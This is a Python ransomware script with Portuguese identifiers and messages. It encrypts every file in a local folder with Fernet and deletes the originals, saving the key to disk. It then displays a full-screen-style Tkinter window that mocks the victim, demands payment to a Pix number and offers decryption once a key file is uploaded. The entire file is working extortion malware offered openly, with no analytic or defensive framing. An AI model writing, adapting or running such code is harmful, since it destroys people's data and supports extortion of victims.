import os, sys, subprocess

current_dir = os.getcwd()

requirements_file = os.path.join(current_dir, "requirements.txt")

subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file])

from cryptography.fernet import Fernet

caminho = os.path.join(current_dir, "pasta_importante")

key = Fernet.generate_key()


with open("chave.rans", 'wb') as key_file:
    key_file.write(key)

extensions = []

def Criptografar(caminho, key):
    for root, _, files in os.walk(caminho):
        for filename in files:
            file_path = os.path.join(root, filename)

            with open(file_path, 'rb') as file:
                file_data = file.read()

            cipher = Fernet(key)
            name = os.path.splitext(filename)[0]

            encrypted_data= cipher.encrypt(file_data)

            encrypted_file_path = os.path.join(root, name + ".bin")
            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)

            os.remove(file_path)
      



def Extensao(caminho):
    extensions = []
    for root, _, files in os.walk(caminho):
        for filename in files:
            file_path = os.path.join(root, filename)

            extension = os.path.splitext(filename)[1]
            extensions.append(extension)

    return extensions


def Descriptografar(arquivo, key, extensions):
    i = 0
    with open(arquivo, 'rb') as chave:
        key = chave.read()
    for root, _, files in os.walk(caminho):
        for filename in files:
            file_path = os.path.join(root, filename)

            cipher = Fernet(key)

            with open(file_path, 'rb') as file:
                file_data = file.read()

            
            original_data= cipher.decrypt(file_data)

            name = os.path.splitext(file_path)[0]

            original_file = os.path.join(root, name + extensions[i])

            with open(original_file, 'wb') as file_des:
                file_des.write(original_data)

            os.remove(file_path)
            i = i+1


extensions = Extensao(caminho)
Criptografar(caminho, key)

chave = os.path.join(current_dir, "chave.rans")
#shutil.move(chave, caminho)

import tkinter as tk
from tkinter import filedialog

def enviar_arquivo():
    arquivo = filedialog.askopenfilename()  
    if arquivo:
        Descriptografar(arquivo, key, extensions)
        janela.destroy()
        

janela = tk.Tk()
janela.overrideredirect(True)

largura_monitor = janela.winfo_screenwidth()
altura_monitor = janela.winfo_screenheight()

largura_janela = largura_monitor // 2 
altura_janela = altura_monitor // 2  

pos_x = (largura_monitor - largura_janela) // 2
pos_y = (altura_monitor - altura_janela) // 2

janela.geometry(f"{largura_janela}x{altura_janela}+{pos_x}+{pos_y}")

janela.configure(bg="#CCCCCC")

label = tk.Label(janela, text="Ransomware", background="red")
label.pack(side="top")

label = tk.Label(janela, text="Hahaha LOL, seus arquivos foram criptografados",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="Caso queira recuperar seus preciosos arquivos, você tem que me",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="PAGAR >:D",background="orange")
label.pack()

label = tk.Label(janela, text="Depois de me pagar irei te enviar uma chave, espero que a chave não tenha salvado sem querer no seu computador :p",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="o meu pix é 19423-42952, só me enviar e depois colocar o arquivo da chave ali embaixo",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="|",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="|",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="|",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="|",background="#CCCCCC")
label.pack()

label = tk.Label(janela, text="v",background="#CCCCCC")
label.pack()

botao_enviar_arquivo = tk.Button(janela, text="Enviar Arquivo", bg="green",command=enviar_arquivo)
botao_enviar_arquivo.pack()

janela.mainloop()



